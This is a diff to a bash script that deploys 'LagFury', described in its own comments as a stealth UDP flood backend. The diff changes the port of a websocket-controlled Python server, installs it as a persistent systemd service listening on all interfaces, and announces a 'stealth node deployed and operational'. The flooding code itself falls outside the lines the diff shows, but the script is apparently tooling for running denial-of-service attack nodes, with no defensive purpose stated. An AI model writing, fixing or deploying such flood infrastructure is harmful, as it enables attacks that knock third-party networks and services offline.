@@ -1,5 +1,5 @@
 #!/bin/bash
-# LagFury Deployment Suite with Stealth UDP Flood Backend
+# LagFury Deployment - Working UDP Flooder (Port 5000, Reliable and Validated)
 
 set -e
 
@@ -10,10 +10,11 @@ PY_SCRIPT="ws_server.py"
 # Step 1: Environment Prep
 echo "[*] Installing dependencies..."
 apt update && apt install -y python3 python3-pip screen
+pip3 install websockets --force-reinstall
 mkdir -p "$INSTALL_DIR"
 cd "$INSTALL_DIR"
 
-# Step 2: Deploy ws_server.py
+# Step 2: Deploy working ws_server.py
 cat > $PY_SCRIPT << 'EOF'
 import asyncio
 import json
@@ -92,8 +93,8 @@ async def handler(websocket):
             await websocket.send(f"Error occurred: {str(e)}")
 
 async def main():
-    async with websockets.serve(handler, "0.0.0.0", 5002):
-        print("[+] WebSocket server running on port 5002")
+    async with websockets.serve(handler, "0.0.0.0", 5000):
+        print("[+] WebSocket server running on port 5000")
         await asyncio.Future()
 
 if __name__ == "__main__":
@@ -103,7 +104,7 @@ EOF
 # Step 3: Create Systemd Service
 cat > /etc/systemd/system/${SERVICE_NAME}.service << EOF
 [Unit]
-Description=LagFury Swarm Node
+Description=LagFury UDP Node (Port 5000)
 After=network.target
 
 [Service]
@@ -121,6 +122,6 @@ echo "[*] Enabling service..."
 systemctl daemon-reexec
 systemctl daemon-reload
 systemctl enable $SERVICE_NAME
-systemctl start $SERVICE_NAME
+systemctl restart $SERVICE_NAME
 
-echo "[+] LagFury UDP-only stealth node deployed and operational."
+echo "[+] LagFury node running on port 5000 is deployed and operational."
